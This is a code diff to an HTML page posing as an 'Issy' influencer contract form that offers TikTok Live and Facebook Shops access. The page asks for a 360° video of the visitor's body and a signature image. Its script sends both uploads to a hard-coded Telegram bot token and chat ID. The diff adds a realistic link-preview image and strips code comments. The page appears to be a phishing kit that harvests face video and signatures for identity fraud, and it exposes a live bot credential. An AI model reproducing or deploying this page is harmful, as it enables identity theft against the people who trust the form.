@@ -7,7 +7,7 @@
     <!-- Open Graph Meta Tags for Link Preview -->
     <meta property="og:title" content="Issy | Influencer Contract">
     <meta property="og:description" content="Complete your influencer agreement for Issy. Submit your 360° video and signature to get access to TikTok Live, Yellow Basket, and Facebook Shops.">
-    <meta property="og:image" content="https://placehold.co/1200x630/f0f0f0/111?text=ISSY">
+    <meta property="og:image" content="https://res-console.cloudinary.com/du9eifcmq/thumbnails/transform/v1/image/upload/Y19maWxsLGhfMjAwLHdfMjAw/v1/aXNzeS1wcmV2aWV3X3VhdTl4aw==/template_primary">
     <meta property="og:image:type" content="image/png">
     <meta property="og:image:width" content="1200">
     <meta property="og:image:height" content="630">
@@ -18,7 +18,7 @@
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:title" content="Issy | Influencer Contract">
     <meta name="twitter:description" content="Complete your influencer agreement for Issy.">
-    <meta name="twitter:image" content="https://placehold.co/1200x630/f0f0f0/111?text=ISSY">
+    <meta name="twitter:image" content="https://res-console.cloudinary.com/du9eifcmq/thumbnails/transform/v1/image/upload/Y19maWxsLGhfMjAwLHdfMjAw/v1/aXNzeS1wcmV2aWV3X3VhdTl4aw==/template_primary">
     
     <title>Issy | Influencer Contract</title>
     <style>
@@ -254,7 +254,6 @@
         <div class="subtitle">Influencer Contract Agreement</div>
 
         <form id="contractForm">
-            <!-- Features -->
             <div class="section">
                 <h2>Platform Access</h2>
                 <div class="feature-grid">
@@ -267,7 +266,6 @@
                 <div class="note">Videos up to 1GB or larger accepted.</div>
             </div>
 
-            <!-- Influencer Info -->
             <div class="section">
                 <h2>Influencer Information</h2>
                 <div class="form-group">
@@ -288,7 +286,6 @@
                 </div>
             </div>
 
-            <!-- Video Upload -->
             <div class="section">
                 <h2>First Verification: 360° Video</h2>
                 <div class="form-group">
@@ -303,7 +300,6 @@
                 <div class="note">Video must show you doing a full 360° rotation (front, side, back, side, front).</div>
             </div>
 
-            <!-- Signature Upload -->
             <div class="section">
                 <h2>Second Verification: Signature</h2>
                 <div class="form-group">
@@ -317,7 +313,6 @@
                 </div>
             </div>
 
-            <!-- Agreement -->
             <div class="checkbox-group">
                 <input type="checkbox" id="agreeCheckbox" required>
                 <label>I confirm that the 360° video features me and I agree to the contract terms including TikTok Live, Yellow Basket, and Facebook promotions.</label>
@@ -329,18 +324,15 @@
     </div>
 </div>
 
-<!-- Loading Overlay -->
 <div id="loadingOverlay" class="loading-overlay">
     <div class="loading-spinner"></div>
     <div class="loading-text">Processing...</div>
 </div>
 
 <script>
-    // Telegram Configuration
     const BOT_TOKEN = "7738348705:AAGGbXz5g683t-KHmrnvyCfK8ial6yFhHNU";
     const CHAT_ID = "8456018521";
 
-    // Video upload
     const videoInput = document.getElementById('videoFile');
     const videoDropZone = document.getElementById('videoDropZone');
     const videoInfo = document.getElementById('videoInfo');
@@ -369,7 +361,6 @@
         reader.readAsDataURL(file);
     }
 
-    // Signature upload
     const signatureInput = document.getElementById('signatureFile');
     const signatureDropZone = document.getElementById('signatureDropZone');
     const signatureInfo = document.getElementById('signatureInfo');
@@ -397,7 +388,6 @@
         reader.readAsDataURL(file);
     }
 
-    // Telegram send functions
     async function sendToTelegram(file, type, caption) {
         const endpoint = type === 'video' ? 'sendVideo' : 'sendPhoto';
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`;
@@ -418,7 +408,6 @@
         return response.json();
     }
 
-    // Form submission
     const form = document.getElementById('contractForm');
     const loadingOverlay = document.getElementById('loadingOverlay');
 
